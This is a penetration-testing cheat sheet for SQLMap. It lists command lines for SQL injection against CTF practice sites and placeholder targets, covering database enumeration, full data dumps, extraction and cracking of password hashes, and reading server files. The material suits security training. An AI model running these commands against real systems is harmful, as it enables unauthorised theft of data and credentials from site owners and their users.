# SQLMap

Enumerate and extract data from SQL databases

Download SQLMap [here](http://sqlmap.org/) or clone it on [GitHub](https://github.com/sqlmapproject/sqlmap)


## GET request

SQL-injection in URL's (GET requests):
```bash
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC"
```

## POST request
SQL-injection in POST params (eg. login-forms)
```bash
sqlmap --method=POST -u "http://challenge01.root-me.org/web-serveur/ch9/" --data="login=admin&password=poo"
```

Tutorials:
* [Basic](https://www.youtube.com/watch?v=yPMbb38pwVI)
* [Introduction to SQLMap](https://www.gracefulsecurity.com/introduction-to-sqlmap/)





https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/
https://www.hackingarticles.in/comprehensive-guide-to-sqlmap-target-options15249-2/
https://www.hackingarticles.in/command-injection-exploitation-through-sqlmap-in-dvwa/
sqlmap 
-------

scan multiple target
sqlmap -m /root/Desktop/s.txt --dbs --batch

Databases
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch

Tables
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch

Columns
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch

Get data from a table
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch

Dump All
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch



SQLMap

    sqlmap -u http://xxx.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3       //  Automated sqlmap scan
    sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
    sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/xxx.php" // Targeted sqlmap scan
    sqlmap -u "http://xxx.com/xxx.php?id=1" --dbms=mysql --tech=U --random-agent --dump //  Scan url for union + error based injection with mysql backend and use a random user agent + database dump
    sqlmap -o -u "http://xxx.com/form/" –forms // sqlmap check form for injection
    sqlmap -o -u "http://xxx/vuln-form" --forms -D database-name -T users –dump // sqlmap dump and crack hashes for table users on database-name.
    sqlmap --flush session
        Flushes the session
    sqlmap -p user --technique=B
        Attempts to exploit the “user” field using boolean technique.
